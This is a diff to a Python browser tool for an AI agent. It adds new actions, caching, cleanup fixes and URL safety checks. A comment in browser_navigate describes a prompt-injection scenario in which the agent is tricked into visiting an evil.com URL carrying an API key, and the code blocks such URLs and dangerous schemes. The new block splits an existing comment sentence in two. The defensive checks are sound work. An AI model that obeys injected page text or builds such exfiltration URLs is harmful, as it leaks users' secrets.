@@ -50,6 +50,7 @@ Usage:
 """
 
 import atexit
+import functools
 import json
 import logging
 import os
@@ -94,13 +95,19 @@ logger = logging.getLogger(__name__)
 
 # Standard PATH entries for environments with minimal PATH (e.g. systemd services).
 # Includes macOS Homebrew paths (/opt/homebrew/* for Apple Silicon).
+# Canonical definition lives in tools/environments/local.py; re-exported here for
+# backward compatibility (tests import _SANE_PATH from browser_tool).
+# NOTE: This constant is intentionally duplicated from tools/environments/local.py
+# because importing from there breaks isolated test module loading in test_managed_*.py.
 _SANE_PATH = (
     "/opt/homebrew/bin:/opt/homebrew/sbin:"
-    "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+    "/usr/local/sbin:/usr/local/bin:"
+    "/usr/sbin:/usr/bin:/sbin:/bin"
 )
 
 
-def _discover_homebrew_node_dirs() -> list[str]:
+@functools.lru_cache(maxsize=1)
+def _discover_homebrew_node_dirs() -> tuple[str, ...]:
     """Find Homebrew versioned Node.js bin directories (e.g. node@20, node@24).
 
     When Node is installed via ``brew install node@24`` and NOT linked into
@@ -110,7 +117,7 @@ def _discover_homebrew_node_dirs() -> list[str]:
     dirs: list[str] = []
     homebrew_opt = "/opt/homebrew/opt"
     if not os.path.isdir(homebrew_opt):
-        return dirs
+        return tuple(dirs)
     try:
         for entry in os.listdir(homebrew_opt):
             if entry.startswith("node") and entry != "node":
@@ -120,7 +127,7 @@ def _discover_homebrew_node_dirs() -> list[str]:
                     dirs.append(bin_dir)
     except OSError:
         pass
-    return dirs
+    return tuple(dirs)
 
 # Throttle screenshot cleanup to avoid repeated full directory scans.
 _last_screenshot_cleanup_by_dir: dict[str, float] = {}
@@ -132,11 +139,12 @@ _last_screenshot_cleanup_by_dir: dict[str, float] = {}
 # Default timeout for browser commands (seconds)
 DEFAULT_COMMAND_TIMEOUT = 30
 
-# Default session timeout (seconds)
-DEFAULT_SESSION_TIMEOUT = 300
-
 # Max tokens for snapshot content before summarization
 SNAPSHOT_SUMMARIZE_THRESHOLD = 8000
+
+
+_cached_command_timeout: Optional[int] = None
+_command_timeout_resolved = False
 
 
 def _get_command_timeout() -> int:
@@ -145,15 +153,22 @@ def _get_command_timeout() -> int:
     Reads ``config["browser"]["command_timeout"]`` and falls back to
     ``DEFAULT_COMMAND_TIMEOUT`` (30s) if unset or unreadable.
     """
+    global _cached_command_timeout, _command_timeout_resolved
+    if _command_timeout_resolved:
+        return _cached_command_timeout  # type: ignore[return-value]
+
+    _command_timeout_resolved = True
+    result = DEFAULT_COMMAND_TIMEOUT
     try:
         from hermes_cli.config import read_raw_config
         cfg = read_raw_config()
         val = cfg.get("browser", {}).get("command_timeout")
         if val is not None:
-            return max(int(val), 5)  # Floor at 5s to avoid instant kills
+            result = max(int(val), 5)  # Floor at 5s to avoid instant kills
     except Exception as e:
         logger.debug("Could not read command_timeout from config: %s", e)
-    return DEFAULT_COMMAND_TIMEOUT
+    _cached_command_timeout = result
+    return result
 
 
 def _get_vision_model() -> Optional[str]:
@@ -239,6 +254,8 @@ _cached_cloud_provider: Optional[CloudBrowserProvider] = None
 _cloud_provider_resolved = False
 _allow_private_urls_resolved = False
 _cached_allow_private_urls: Optional[bool] = None
+_cached_agent_browser: Optional[str] = None
+_agent_browser_resolved = False
 
 
 def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
@@ -378,7 +395,21 @@ _cleanup_done = False
 # Session inactivity timeout (seconds) - cleanup if no activity for this long
 # Default: 5 minutes. Needs headroom for LLM reasoning between browser commands,
 # especially when subagents are doing multi-step browser tasks.
-BROWSER_SESSION_INACTIVITY_TIMEOUT = int(os.environ.get("BROWSER_INACTIVITY_TIMEOUT", "300"))
+# Reads from config.yaml (browser.inactivity_timeout) first, then falls back to
+# BROWSER_INACTIVITY_TIMEOUT env var, then hardcoded 300s default — matching the
+# pattern used by _get_command_timeout() and other config values.
+def _get_inactivity_timeout() -> int:
+    try:
+        from hermes_cli.config import read_raw_config
+        cfg = read_raw_config()
+        val = cfg.get("browser", {}).get("inactivity_timeout")
+        if val is not None:
+            return max(int(val), 30)  # Floor at 30s to avoid overly aggressive reaping
+    except Exception:
+        pass
+    return int(os.environ.get("BROWSER_INACTIVITY_TIMEOUT", "300"))
+
+BROWSER_SESSION_INACTIVITY_TIMEOUT = _get_inactivity_timeout()
 
 # Track last activity time per session
 _session_last_activity: Dict[str, float] = {}
@@ -415,7 +446,7 @@ def _emergency_cleanup_all_sessions():
         with _cleanup_lock:
             _active_sessions.clear()
             _session_last_activity.clear()
-        _recording_sessions.clear()
+            _recording_sessions.clear()
 
 
 # Register cleanup via atexit only.  Previous versions installed SIGINT/SIGTERM
@@ -549,7 +580,7 @@ BROWSER_TOOL_SCHEMAS = [
     },
     {
         "name": "browser_click",
-        "description": "Click on an element identified by its ref ID from the snapshot (e.g., '@e5'). The ref IDs are shown in square brackets in the snapshot output. Requires browser_navigate and browser_snapshot to be called first.",
+        "description": "Click on an element identified by its ref ID from the snapshot (e.g., '@e5'). The ref IDs are shown in square brackets in the snapshot output. Requires browser_navigate to be called first.",
         "parameters": {
             "type": "object",
             "properties": {
@@ -563,7 +594,7 @@ BROWSER_TOOL_SCHEMAS = [
     },
     {
         "name": "browser_type",
-        "description": "Type text into an input field identified by its ref ID. Clears the field first, then types the new text. Requires browser_navigate and browser_snapshot to be called first.",
+        "description": "Type text into an input field identified by its ref ID. Clears the field first, then types the new text. Requires browser_navigate to be called first.",
         "parameters": {
             "type": "object",
             "properties": {
@@ -581,7 +612,7 @@ BROWSER_TOOL_SCHEMAS = [
     },
     {
         "name": "browser_scroll",
-        "description": "Scroll the page in a direction. Use this to reveal more content that may be below or above the current viewport. Requires browser_navigate to be called first.",
+        "description": "Scroll the page in a direction. Scrolls roughly one viewport (500px). Use this to reveal more content that may be below or above the current viewport. Requires browser_navigate to be called first.",
         "parameters": {
             "type": "object",
             "properties": {
@@ -615,15 +646,6 @@ BROWSER_TOOL_SCHEMAS = [
                 }
             },
             "required": ["key"]
-        }
-    },
-    {
-        "name": "browser_close",
-        "description": "Close the browser session and release resources. Call this when done with browser tasks to free up cloud browser session quota.",
-        "parameters": {
-            "type": "object",
-            "properties": {},
-            "required": []
         }
     },
     {
@@ -671,6 +693,84 @@ BROWSER_TOOL_SCHEMAS = [
                 }
             },
             "required": []
+        }
+    },
+    {
+        "name": "browser_hover",
+        "description": "Hover over an element to trigger hover states, dropdown menus, or tooltips. Identify the element by its ref ID from the snapshot (e.g., @e5).",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "ref": {
+                    "type": "string",
+                    "description": "The element reference from the snapshot (e.g., '@e5', '@e12')"
+                }
+            },
+            "required": ["ref"]
+        }
+    },
+    {
+        "name": "browser_select",
+        "description": "Select an option from a dropdown menu (<select> element) by its value. Identify the dropdown by its ref ID from the snapshot.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "ref": {
+                    "type": "string",
+                    "description": "The element reference from the snapshot (e.g., '@e5', '@e12')"
+                },
+                "value": {
+                    "type": "string",
+                    "description": "The value of the option to select"
+                }
+            },
+            "required": ["ref", "value"]
+        }
+    },
+    {
+        "name": "browser_wait",
+        "description": "Wait for an element to appear or a specified number of milliseconds. Pass a CSS selector (e.g., \"#loading-spinner\") to wait for an element, or a number (e.g., \"2000\") to wait for that many milliseconds. Useful for waiting for dynamic content to load on SPAs.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "selector_or_ms": {
+                    "type": "string",
+                    "description": "A CSS selector to wait for an element, or a number in milliseconds to wait (e.g., '2000')"
+                }
+            },
+            "required": ["selector_or_ms"]
+        }
+    },
+    {
+        "name": "browser_forward",
+        "description": "Navigate forward to the next page in browser history. Requires browser_navigate to be called first.",
+        "parameters": {
+            "type": "object",
+            "properties": {},
+            "required": []
+        }
+    },
+    {
+        "name": "browser_reload",
+        "description": "Reload the current page. Useful when page content may have changed or to retry a failed page load.",
+        "parameters": {
+            "type": "object",
+            "properties": {},
+            "required": []
+        }
+    },
+    {
+        "name": "browser_scroll_to",
+        "description": "Scroll the page until a specific element is visible in the viewport. Identify the element by its ref ID from the snapshot.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "ref": {
+                    "type": "string",
+                    "description": "The element reference from the snapshot (e.g., '@e5', '@e12')"
+                }
+            },
+            "required": ["ref"]
         }
     },
 ]
@@ -754,9 +854,17 @@ def _get_session_info(task_id: Optional[str] = None) -> Dict[str, str]:
     
     with _cleanup_lock:
         # Double-check: another thread may have created a session while we
-        # were doing the network call. Use the existing one to avoid leaking
-        # orphan cloud sessions.
+        # were doing the network call. Use the existing one and close the
+        # duplicate to avoid leaking orphan cloud sessions.
         if task_id in _active_sessions:
+            # Close the session we just created to avoid leaking it
+            if session_info.get("bb_session_id") and provider is not None:
+                try:
+                    provider.close_session(session_info["bb_session_id"])
+                    logger.debug("Closed duplicate session %s for task %s",
+                                 session_info.get("session_name"), task_id)
+                except Exception:
+                    pass
             return _active_sessions[task_id]
         _active_sessions[task_id] = session_info
     
@@ -777,10 +885,26 @@ def _find_agent_browser() -> str:
     Raises:
         FileNotFoundError: If agent-browser is not installed
     """
+    global _cached_agent_browser, _agent_browser_resolved
+    if _agent_browser_resolved:
+        if _cached_agent_browser is None:
+            raise FileNotFoundError(
+                "agent-browser CLI not found (cached). Install it with: "
+                f"{_browser_install_hint()}\n"
+                "Or run 'npm install' in the repo root to install locally.\n"
+                "Or ensure npx is available in your PATH."
+            )
+        return _cached_agent_browser
+
+    # Note: _agent_browser_resolved is set at each return site below
+    # (not before the search) to prevent a race where a concurrent thread
+    # sees resolved=True but _cached_agent_browser is still None.
 
     # Check if it's in PATH (global install)
     which_result = shutil.which("agent-browser")
     if which_result:
+        _cached_agent_browser = which_result
+        _agent_browser_resolved = True
         return which_result
 
     # Build an extended search PATH including Homebrew and Hermes-managed dirs.
@@ -800,21 +924,29 @@ def _find_agent_browser() -> str:
         extended_path = os.pathsep.join(extra_dirs)
         which_result = shutil.which("agent-browser", path=extended_path)
         if which_result:
+            _cached_agent_browser = which_result
+            _agent_browser_resolved = True
             return which_result
 
     # Check local node_modules/.bin/ (npm install in repo root)
     repo_root = Path(__file__).parent.parent
     local_bin = repo_root / "node_modules" / ".bin" / "agent-browser"
     if local_bin.exists():
-        return str(local_bin)
+        _cached_agent_browser = str(local_bin)
+        _agent_browser_resolved = True
+        return _cached_agent_browser
     
     # Check common npx locations (also search extended dirs)
     npx_path = shutil.which("npx")
     if not npx_path and extra_dirs:
         npx_path = shutil.which("npx", path=os.pathsep.join(extra_dirs))
     if npx_path:
-        return "npx agent-browser"
+        _cached_agent_browser = "npx agent-browser"
+        _agent_browser_resolved = True
+        return _cached_agent_browser
     
+    # Nothing found — cache the failure so subsequent calls don't re-scan.
+    _agent_browser_resolved = True
     raise FileNotFoundError(
         "agent-browser CLI not found. Install it with: "
         f"{_browser_install_hint()}\n"
@@ -970,6 +1102,13 @@ def _run_browser_command(
         try:
             proc.wait(timeout=timeout)
         except subprocess.TimeoutExpired:
+            # Attempt to close the browser session after timeout to avoid
+            # leaving a hung daemon with a broken page.
+            if command != "close":
+                try:
+                    _run_browser_command(task_id, "close", [], timeout=5)
+                except Exception:
+                    pass
             proc.kill()
             proc.wait()
             logger.warning("browser '%s' timed out after %ds (task=%s, socket_dir=%s)",
@@ -994,14 +1133,15 @@ def _run_browser_command(
             level = logging.WARNING if returncode != 0 else logging.DEBUG
             logger.log(level, "browser '%s' stderr: %s", command, stderr.strip()[:500])
         
-        # Log empty output as warning — common sign of broken agent-browser
-        if not stdout.strip() and returncode == 0:
-            logger.warning("browser '%s' returned empty stdout with rc=0. "
-                           "cmd=%s stderr=%s",
-                           command, " ".join(cmd_parts[:4]) + "...",
-                           (stderr or "")[:200])
-
         stdout_text = stdout.strip()
+
+        # Empty output with rc=0 is a broken state — treat as failure rather
+        # than silently returning {"success": True, "data": {}}.
+        # Some commands (close, record) legitimately return no output.
+        _EMPTY_OK_COMMANDS = {"close", "record", "forward", "reload"}
+        if not stdout_text and returncode == 0 and command not in _EMPTY_OK_COMMANDS:
+            logger.warning("browser '%s' returned empty output (rc=0)", command)
+            return {"success": False, "error": f"Browser command '{command}' returned no output"}
 
         if stdout_text:
             try:
@@ -1115,7 +1255,11 @@ def _extract_relevant_content(
 
 def _truncate_snapshot(snapshot_text: str, max_chars: int = 8000) -> str:
     """
-    Simple truncation fallback for snapshots.
+    Structure-aware truncation for snapshots.
+
+    Cuts at line boundaries so that accessibility tree elements are never
+    split mid-line, and appends a note telling the agent how much was
+    omitted.
     
     Args:
         snapshot_text: The snapshot text to truncate
@@ -1126,8 +1270,19 @@ def _truncate_snapshot(snapshot_text: str, max_chars: int = 8000) -> str:
     """
     if len(snapshot_text) <= max_chars:
         return snapshot_text
-    
-    return snapshot_text[:max_chars] + "\n\n[... content truncated ...]"
+
+    lines = snapshot_text.split('\n')
+    result = []
+    chars = 0
+    for line in lines:
+        if chars + len(line) + 1 > max_chars - 80:  # reserve space for truncation note
+            break
+        result.append(line)
+        chars += len(line) + 1
+    remaining = len(lines) - len(result)
+    if remaining > 0:
+        result.append(f'\n[... {remaining} more lines truncated, use browser_snapshot for full content]')
+    return '\n'.join(result)
 
 
 # ============================================================================
@@ -1146,10 +1301,30 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         JSON string with navigation result (includes stealth features info on first nav)
     """
     # Secret exfiltration protection — block URLs that embed API keys or
+    # Block dangerous URL schemes in cloud mode (javascript:, data:, blob:).
+    # Local mode skips this since the user already has terminal access.
+    if not _is_local_backend():
+        _scheme = url.split(":", 1)[0].lower().strip() if ":" in url else ""
+        if _scheme in ("javascript", "data", "blob", "vbscript"):
+            return json.dumps({
+                "success": False,
+                "error": f"Blocked: '{_scheme}:' URLs are not allowed in cloud mode.",
+            })
+
     # tokens in query parameters. A prompt injection could trick the agent
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
+    # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
+    import urllib.parse
     from agent.redact import _PREFIX_RE
-    if _PREFIX_RE.search(url):
+    # Fully decode percent-encoding to catch double/triple-encoded secrets
+    # (e.g. sk%252Dant%252D... → sk%2Dant%2D... → sk-ant-...).
+    url_decoded = url
+    for _ in range(5):  # max decode depth to prevent infinite loop
+        prev = url_decoded
+        url_decoded = urllib.parse.unquote(prev)
+        if url_decoded == prev:
+            break
+    if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
         return json.dumps({
             "success": False,
             "error": "Blocked: URL contains what appears to be an API key or token. "
@@ -1256,7 +1431,13 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
                 snapshot_text = snap_data.get("snapshot", "")
                 refs = snap_data.get("refs", {})
                 if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD:
-                    snapshot_text = _truncate_snapshot(snapshot_text)
+                    # Use the URL as a task hint for smarter summarization
+                    try:
+                        snapshot_text = _extract_relevant_content(
+                            snapshot_text, f"Navigated to {url}"
+                        )
+                    except Exception:
+                        snapshot_text = _truncate_snapshot(snapshot_text)
                 response["snapshot"] = snapshot_text
                 response["element_count"] = len(refs) if refs else 0
         except Exception as e:
@@ -1415,13 +1596,15 @@ def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
             "error": f"Invalid direction '{direction}'. Use 'up' or 'down'."
         }, ensure_ascii=False)
 
-    # Repeat the scroll 5 times to get meaningful page movement.
-    # Most backends scroll ~100px per call, which is barely visible.
-    # 5x gives roughly half a viewport of travel, backend-agnostic.
-    _SCROLL_REPEATS = 5
+    # Single scroll with pixel amount instead of 5x subprocess calls.
+    # agent-browser supports: agent-browser scroll down 500
+    # _SCROLL_REPEATS = 5  # kept as reference; replaced by pixel-based scroll
+    _SCROLL_PIXELS = 500  # roughly equivalent to 5 viewport scrolls
 
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_scroll
+        # Camofox REST API doesn't support pixel args; use repeated calls
+        _SCROLL_REPEATS = 5
         result = None
         for _ in range(_SCROLL_REPEATS):
             result = camofox_scroll(direction, task_id)
@@ -1429,14 +1612,12 @@ def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
 
     effective_task_id = task_id or "default"
 
-    result = None
-    for _ in range(_SCROLL_REPEATS):
-        result = _run_browser_command(effective_task_id, "scroll", [direction])
-        if not result.get("success"):
-            return json.dumps({
-                "success": False,
-                "error": result.get("error", f"Failed to scroll {direction}")
-            }, ensure_ascii=False)
+    result = _run_browser_command(effective_task_id, "scroll", [direction, str(_SCROLL_PIXELS)])
+    if not result.get("success"):
+        return json.dumps({
+            "success": False,
+            "error": result.get("error", f"Failed to scroll {direction}")
+        }, ensure_ascii=False)
 
     return json.dumps({
         "success": True,
@@ -1471,6 +1652,198 @@ def browser_back(task_id: Optional[str] = None) -> str:
         return json.dumps({
             "success": False,
             "error": result.get("error", "Failed to go back")
+        }, ensure_ascii=False)
+
+
+def browser_hover(ref: str, task_id: Optional[str] = None) -> str:
+    """
+    Hover over an element to trigger hover states, dropdown menus, or tooltips.
+
+    Args:
+        ref: Element reference (e.g., "@e5")
+        task_id: Task identifier for session isolation
+
+    Returns:
+        JSON string with hover result
+    """
+    if _is_camofox_mode():
+        return json.dumps({"success": False, "error": "Hover not supported in Camofox mode"}, ensure_ascii=False)
+
+    effective_task_id = task_id or "default"
+
+    # Ensure ref starts with @
+    if not ref.startswith("@"):
+        ref = f"@{ref}"
+
+    result = _run_browser_command(effective_task_id, "hover", [ref])
+
+    if result.get("success"):
+        return json.dumps({
+            "success": True,
+            "hovered": ref
+        }, ensure_ascii=False)
+    else:
+        return json.dumps({
+            "success": False,
+            "error": result.get("error", f"Failed to hover {ref}")
+        }, ensure_ascii=False)
+
+
+def browser_select(ref: str, value: str, task_id: Optional[str] = None) -> str:
+    """
+    Select an option from a dropdown menu (<select> element) by its value.
+
+    Args:
+        ref: Element reference (e.g., "@e5")
+        value: The value of the option to select
+        task_id: Task identifier for session isolation
+
+    Returns:
+        JSON string with select result
+    """
+    if _is_camofox_mode():
+        return json.dumps({"success": False, "error": "Select not supported in Camofox mode"}, ensure_ascii=False)
+
+    effective_task_id = task_id or "default"
+
+    # Ensure ref starts with @
+    if not ref.startswith("@"):
+        ref = f"@{ref}"
+
+    result = _run_browser_command(effective_task_id, "select", [ref, value])
+
+    if result.get("success"):
+        return json.dumps({
+            "success": True,
+            "selected": value,
+            "ref": ref
+        }, ensure_ascii=False)
+    else:
+        return json.dumps({
+            "success": False,
+            "error": result.get("error", f"Failed to select '{value}' on {ref}")
+        }, ensure_ascii=False)
+
+
+def browser_wait(selector_or_ms: str, task_id: Optional[str] = None) -> str:
+    """
+    Wait for an element to appear or a specified number of milliseconds.
+
+    Args:
+        selector_or_ms: CSS selector to wait for, or milliseconds as a string
+        task_id: Task identifier for session isolation
+
+    Returns:
+        JSON string with wait result
+    """
+    if _is_camofox_mode():
+        return json.dumps({"success": False, "error": "Wait not supported in Camofox mode"}, ensure_ascii=False)
+
+    effective_task_id = task_id or "default"
+
+    result = _run_browser_command(effective_task_id, "wait", [selector_or_ms])
+
+    if result.get("success"):
+        return json.dumps({
+            "success": True,
+            "waited_for": selector_or_ms
+        }, ensure_ascii=False)
+    else:
+        return json.dumps({
+            "success": False,
+            "error": result.get("error", f"Failed to wait for '{selector_or_ms}'")
+        }, ensure_ascii=False)
+
+
+def browser_forward(task_id: Optional[str] = None) -> str:
+    """
+    Navigate forward in browser history.
+
+    Args:
+        task_id: Task identifier for session isolation
+
+    Returns:
+        JSON string with navigation result
+    """
+    if _is_camofox_mode():
+        return json.dumps({"success": False, "error": "Forward not supported in Camofox mode"}, ensure_ascii=False)
+
+    effective_task_id = task_id or "default"
+    result = _run_browser_command(effective_task_id, "forward", [])
+
+    if result.get("success"):
+        data = result.get("data", {})
+        return json.dumps({
+            "success": True,
+            "url": data.get("url", "")
+        }, ensure_ascii=False)
+    else:
+        return json.dumps({
+            "success": False,
+            "error": result.get("error", "Failed to go forward")
+        }, ensure_ascii=False)
+
+
+def browser_reload(task_id: Optional[str] = None) -> str:
+    """
+    Reload the current page.
+
+    Args:
+        task_id: Task identifier for session isolation
+
+    Returns:
+        JSON string with reload result
+    """
+    if _is_camofox_mode():
+        return json.dumps({"success": False, "error": "Reload not supported in Camofox mode"}, ensure_ascii=False)
+
+    effective_task_id = task_id or "default"
+    result = _run_browser_command(effective_task_id, "reload", [])
+
+    if result.get("success"):
+        data = result.get("data", {})
+        return json.dumps({
+            "success": True,
+            "url": data.get("url", "")
+        }, ensure_ascii=False)
+    else:
+        return json.dumps({
+            "success": False,
+            "error": result.get("error", "Failed to reload page")
+        }, ensure_ascii=False)
+
+
+def browser_scroll_to(ref: str, task_id: Optional[str] = None) -> str:
+    """
+    Scroll the page until a specific element is visible in the viewport.
+
+    Args:
+        ref: Element reference (e.g., "@e5")
+        task_id: Task identifier for session isolation
+
+    Returns:
+        JSON string with scroll result
+    """
+    if _is_camofox_mode():
+        return json.dumps({"success": False, "error": "Scroll-to not supported in Camofox mode"}, ensure_ascii=False)
+
+    effective_task_id = task_id or "default"
+
+    # Ensure ref starts with @
+    if not ref.startswith("@"):
+        ref = f"@{ref}"
+
+    result = _run_browser_command(effective_task_id, "scrollintoview", [ref])
+
+    if result.get("success"):
+        return json.dumps({
+            "success": True,
+            "scrolled_to": ref
+        }, ensure_ascii=False)
+    else:
+        return json.dumps({
+            "success": False,
+            "error": result.get("error", f"Failed to scroll to {ref}")
         }, ensure_ascii=False)
 
 
@@ -1607,11 +1980,11 @@ def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
 
 def _camofox_eval(expression: str, task_id: Optional[str] = None) -> str:
     """Evaluate JS via Camofox's /tabs/{tab_id}/eval endpoint (if available)."""
-    from tools.browser_camofox import _get_session, _ensure_tab, _post
+    from tools.browser_camofox import _ensure_tab, _post
     try:
-        session = _get_session(task_id or "default")
-        tab_id = _ensure_tab(session)
-        resp = _post(f"/tabs/{tab_id}/eval", json_data={"expression": expression})
+        tab_info = _ensure_tab(task_id or "default")
+        tab_id = tab_info.get("tab_id") or tab_info.get("id")
+        resp = _post(f"/tabs/{tab_id}/eval", body={"expression": expression})
 
         # Camofox returns the result in a JSON envelope
         raw_result = resp.get("result") if isinstance(resp, dict) else resp
@@ -1641,8 +2014,9 @@ def _camofox_eval(expression: str, task_id: Optional[str] = None) -> str:
 
 def _maybe_start_recording(task_id: str):
     """Start recording if browser.record_sessions is enabled in config."""
-    if task_id in _recording_sessions:
-        return
+    with _cleanup_lock:
+        if task_id in _recording_sessions:
+            return
     try:
         from hermes_cli.config import read_raw_config
         hermes_home = get_hermes_home()
@@ -1656,13 +2030,13 @@ def _maybe_start_recording(task_id: str):
         recordings_dir.mkdir(parents=True, exist_ok=True)
         _cleanup_old_recordings(max_age_hours=72)
         
-        import time
         timestamp = time.strftime("%Y%m%d_%H%M%S")
         recording_path = recordings_dir / f"session_{timestamp}_{task_id[:16]}.webm"
         
         result = _run_browser_command(task_id, "record", ["start", str(recording_path)])
         if result.get("success"):
-            _recording_sessions.add(task_id)
+            with _cleanup_lock:
+                _recording_sessions.add(task_id)
             logger.info("Auto-recording browser session %s to %s", task_id, recording_path)
         else:
             logger.debug("Could not start auto-recording: %s", result.get("error"))
@@ -1672,8 +2046,9 @@ def _maybe_start_recording(task_id: str):
 
 def _maybe_stop_recording(task_id: str):
     """Stop recording if one is active for this session."""
-    if task_id not in _recording_sessions:
-        return
+    with _cleanup_lock:
+        if task_id not in _recording_sessions:
+            return
     try:
         result = _run_browser_command(task_id, "record", ["stop"])
         if result.get("success"):
@@ -1682,7 +2057,8 @@ def _maybe_stop_recording(task_id: str):
     except Exception as e:
         logger.debug("Could not stop recording for %s: %s", task_id, e)
     finally:
-        _recording_sessions.discard(task_id)
+        with _cleanup_lock:
+            _recording_sessions.discard(task_id)
 
 
 def browser_get_images(task_id: Optional[str] = None) -> str:
@@ -1767,9 +2143,33 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
         from tools.browser_camofox import camofox_vision
         return camofox_vision(question, annotate, task_id)
 
+    # Pre-flight: verify a vision-capable model is available before taking a
+    # screenshot (which involves browser commands and disk I/O).
+    _preflight_vision_model = _get_vision_model()
+    if not _preflight_vision_model:
+        # No explicit vision model — check if call_llm can route a vision task
+        # by looking for a default auxiliary model.  If neither is configured,
+        # fail early with a clear message instead of wasting a screenshot.
+        try:
+            _aux_model = os.getenv("AUXILIARY_MODEL", "").strip()
+            if not _aux_model:
+                from hermes_cli.config import read_raw_config as _rrc
+                _aux_cfg = _rrc()
+                _aux_model = (_aux_cfg.get("auxiliary", {}).get("model") or "").strip()
+        except Exception:
+            _aux_model = ""
+        if not _aux_model:
+            return json.dumps({
+                "success": False,
+                "error": (
+                    "No vision model configured. Set AUXILIARY_VISION_MODEL or "
+                    "auxiliary.model in config.yaml to a multimodal model "
+                    "(e.g. google/gemini-2.0-flash, openai/gpt-4o) to use browser_vision."
+                ),
+            }, ensure_ascii=False)
+
     import base64
     import uuid as uuid_mod
-    from pathlib import Path
     
     effective_task_id = task_id or "default"
     
@@ -1822,7 +2222,25 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
                     f"or a stale daemon process."
                 ),
             }, ensure_ascii=False)
-        
+
+        # Guard against oversized screenshots that would bloat the vision request
+        _screenshot_size = screenshot_path.stat().st_size
+        _MAX_SCREENSHOT_BYTES = 5 * 1024 * 1024  # 5 MB
+        if _screenshot_size > _MAX_SCREENSHOT_BYTES:
+            logger.warning(
+                "browser_vision: screenshot too large (%d bytes > %d limit): %s",
+                _screenshot_size, _MAX_SCREENSHOT_BYTES, screenshot_path,
+            )
+            return json.dumps({
+                "success": False,
+                "error": (
+                    f"Screenshot is too large ({_screenshot_size / 1024 / 1024:.1f} MB, "
+                    f"limit is 5 MB). Try narrowing your focus — scroll to a specific "
+                    f"section or use a smaller viewport before retrying."
+                ),
+                "screenshot_path": str(screenshot_path),
+            }, ensure_ascii=False)
+
         # Read and convert to base64
         image_data = screenshot_path.read_bytes()
         image_base64 = base64.b64encode(image_data).decode("ascii")
@@ -1927,7 +2345,6 @@ def _cleanup_old_screenshots(screenshots_dir, max_age_hours=24):
 
 def _cleanup_old_recordings(max_age_hours=72):
     """Remove browser recordings older than max_age_hours to prevent disk bloat."""
-    import time
     try:
         hermes_home = get_hermes_home()
         recordings_dir = hermes_home / "browser_recordings"
@@ -2041,6 +2458,14 @@ def cleanup_all_browsers() -> None:
     for task_id in task_ids:
         cleanup_browser(task_id)
 
+    # Reset cached lookups so they are re-evaluated on next use.
+    global _cached_agent_browser, _agent_browser_resolved
+    global _cached_command_timeout, _command_timeout_resolved
+    _cached_agent_browser = None
+    _agent_browser_resolved = False
+    _discover_homebrew_node_dirs.cache_clear()
+    _cached_command_timeout = None
+    _command_timeout_resolved = False
 
 
 # ============================================================================
@@ -2215,4 +2640,52 @@ registry.register(
     handler=lambda args, **kw: browser_console(clear=args.get("clear", False), expression=args.get("expression"), task_id=kw.get("task_id")),
     check_fn=check_browser_requirements,
     emoji="🖥️",
+)
+registry.register(
+    name="browser_hover",
+    toolset="browser",
+    schema=_BROWSER_SCHEMA_MAP["browser_hover"],
+    handler=lambda args, **kw: browser_hover(ref=args.get("ref", ""), task_id=kw.get("task_id")),
+    check_fn=check_browser_requirements,
+    emoji="👆",
+)
+registry.register(
+    name="browser_select",
+    toolset="browser",
+    schema=_BROWSER_SCHEMA_MAP["browser_select"],
+    handler=lambda args, **kw: browser_select(ref=args.get("ref", ""), value=args.get("value", ""), task_id=kw.get("task_id")),
+    check_fn=check_browser_requirements,
+    emoji="📋",
+)
+registry.register(
+    name="browser_wait",
+    toolset="browser",
+    schema=_BROWSER_SCHEMA_MAP["browser_wait"],
+    handler=lambda args, **kw: browser_wait(selector_or_ms=args.get("selector_or_ms", ""), task_id=kw.get("task_id")),
+    check_fn=check_browser_requirements,
+    emoji="⏳",
+)
+registry.register(
+    name="browser_forward",
+    toolset="browser",
+    schema=_BROWSER_SCHEMA_MAP["browser_forward"],
+    handler=lambda args, **kw: browser_forward(task_id=kw.get("task_id")),
+    check_fn=check_browser_requirements,
+    emoji="▶️",
+)
+registry.register(
+    name="browser_reload",
+    toolset="browser",
+    schema=_BROWSER_SCHEMA_MAP["browser_reload"],
+    handler=lambda args, **kw: browser_reload(task_id=kw.get("task_id")),
+    check_fn=check_browser_requirements,
+    emoji="🔄",
+)
+registry.register(
+    name="browser_scroll_to",
+    toolset="browser",
+    schema=_BROWSER_SCHEMA_MAP["browser_scroll_to"],
+    handler=lambda args, **kw: browser_scroll_to(ref=args.get("ref", ""), task_id=kw.get("task_id")),
+    check_fn=check_browser_requirements,
+    emoji="🎯",
 )
